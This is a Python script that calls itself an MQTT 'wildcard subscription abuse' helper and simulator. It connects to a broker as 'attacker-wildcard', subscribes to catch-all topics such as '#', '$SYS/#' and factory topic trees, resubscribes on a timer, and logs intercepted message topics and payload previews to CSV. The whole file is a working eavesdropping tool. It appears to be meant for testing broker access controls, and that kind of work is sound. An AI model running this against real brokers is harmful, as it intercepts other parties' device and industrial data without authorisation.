"""MQTT wildcard subscription abuse helper."""

import argparse
import csv
import os
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class WildcardSession:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow(["timestamp_utc", "event", "topic", "payload", "details"])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log(self, event, topic, payload, details):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([datetime.now(timezone.utc).isoformat(), event, topic, payload, details])

    def on_connect(self, client, userdata, flags, rc):
        print(f"[connect] rc={rc}")
        if rc != 0:
            return
        for topic in self.args.topics:
            client.subscribe(topic, qos=self.args.qos)
            print(f"[subscribe] requested {topic} qos={self.args.qos}")

    def on_disconnect(self, client, userdata, rc):
        print(f"[disconnect] rc={rc}")

    def on_subscribe(self, client, userdata, mid, granted_qos):
        detail = ",".join(str(q) for q in granted_qos)
        print(f"[suback] mid={mid} qos={detail}")
        self.log("suback", "", "", detail)

    def on_message(self, client, userdata, msg):
        payload_preview = msg.payload[:64]
        try:
            payload_text = payload_preview.decode("utf-8", errors="replace")
        except AttributeError:
            payload_text = str(payload_preview)
        print(f"[message] topic={msg.topic} len={len(msg.payload)}")
        self.log("message", msg.topic, payload_text, f"len={len(msg.payload)}")

    def resubscribe_loop(self, client):
        if self.args.resubscribe_interval <= 0:
            return
        while not self.stop_event.wait(self.args.resubscribe_interval):
            for topic in self.args.topics:
                client.subscribe(topic, qos=self.args.qos)
                print(f"[resubscribe] {topic}")

def main():
    parser = argparse.ArgumentParser(description="Wildcard subscription abuse simulator")
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--keepalive", type=int, default=60)
    parser.add_argument("--topics", nargs="+", default=["#", "$SYS/#", "factory/+/+/#"])
    parser.add_argument("--qos", type=int, default=0)
    parser.add_argument("--username")
    parser.add_argument("--password")
    parser.add_argument("--client-id", default="attacker-wildcard")
    parser.add_argument("--resubscribe-interval", type=float, default=30.0, help="seconds between refresh subscribe (0 disables)")
    parser.add_argument("--duration", type=float, default=0.0)
    parser.add_argument("--log-csv", help="path to append subscription log")
    args = parser.parse_args()

    session = WildcardSession(args)
    client = mqtt.Client(client_id=args.client_id, clean_session=True)
    if args.username:
        client.username_pw_set(args.username, args.password)

    client.user_data_set(session)
    client.on_connect = session.on_connect
    client.on_disconnect = session.on_disconnect
    client.on_subscribe = session.on_subscribe
    client.on_message = session.on_message

    try:
        client.connect(args.broker, args.port, args.keepalive)
    except Exception as exc:
        print(f"failed to connect: {exc}")
        session.close()
        return

    client.loop_start()

    refresher = threading.Thread(target=session.resubscribe_loop, args=(client,), daemon=True)
    refresher.start()

    try:
        if args.duration > 0:
            session.stop_event.wait(args.duration)
        else:
            while True:
                time.sleep(1.0)
    except KeyboardInterrupt:
        pass

    session.stop_event.set()
    client.loop_stop()
    client.disconnect()
    session.close()

if __name__ == "__main__":
    main()
